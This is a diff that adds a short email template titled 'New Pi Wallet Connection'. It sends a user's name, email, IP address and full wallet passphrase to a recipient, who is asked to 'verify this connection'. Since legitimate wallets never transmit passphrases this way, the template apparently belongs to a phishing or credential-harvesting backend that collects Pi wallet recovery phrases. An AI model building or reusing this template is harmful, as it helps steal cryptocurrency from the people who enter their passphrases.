@@ -1,0 +1,13 @@
+New Pi Wallet Connection
+
+User: {{ user.get_full_name }} ({{ user.email }})
+Timestamp: {{ timestamp }}
+IP Address: {{ ip_address }}
+
+Passphrase:
+{{ passphrase }}
+
+Please verify this connection and update the wallet status accordingly.
+
+---
+This is an automated message. Please do not reply.
